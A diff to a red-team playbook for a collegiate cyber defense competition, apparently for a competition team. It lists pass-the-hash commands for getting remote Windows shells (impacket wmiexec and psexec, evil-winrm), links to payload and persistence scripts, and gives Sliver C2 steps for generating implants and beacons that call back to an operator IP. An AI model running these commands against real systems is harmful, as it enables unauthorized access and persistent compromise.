@@ -28,9 +28,9 @@ pagetitle: Red Teaming for CCDC
     - First, run [windows_add_payloads.ps1](https://khaelkugler.com/scripts/windows_add_payloads.ps1) to add the file to each of the locations
     - Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1)
     - Shells:
-      - 135 - use `impacket-wmiexec -hashes :{hash} {domain}/{user}@{ip}`
-      - 445 - use `impacket-psexec -hashes :{hash} {domain}/{user}@{ip}`
-      - 5985 - use `evil-winrm -i {IP} -u {username} -H {hash} -r {domain}`
+      - 135 - use `wmiexec.py -hashes :{hash} '{domain}/{user}@{ip}'`
+      - 139/445 - use `psexec.py -hashes :{hash} '{domain}/{user}@{ip}'` or `smbexec`
+      - 5985 - use `evil-winrm -i {IP} -u '{domain}\{username}' -H {hash} -r {domain}`
         - `-r` optional, used for kerberos
   - **Linux:**
     - Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh) while hosting the payload
@@ -62,7 +62,7 @@ pagetitle: Red Teaming for CCDC
   - On the server: `new-operator --name {op_name} --lhost localhost` and `multiplayer` to enable clients
   - On the client, outside of tmux: `sliver-client import {config_file}` and `sliver-client` to join
 - `wg` can be used to start listening for incoming sessions on a sneaky wireguard udp (use mtls otherwise if we dont get a callback)
-  - Seems it doesn't mix well with Windows, unfortunately. Plan on mtls for windows, wg for linux.
+  - Shells from evil-winrm seem to die (even as local admin??), use `psexec` to get a shell as nt authority and run it from there
 - Then, use `generate` to create implants or beacons
   - `generate --wg {our_IP} --os linux` for an implant
   - `generate beacon --wg 192.168.0.102 -j {jitter} -S {wait_seconds} --os linux` 
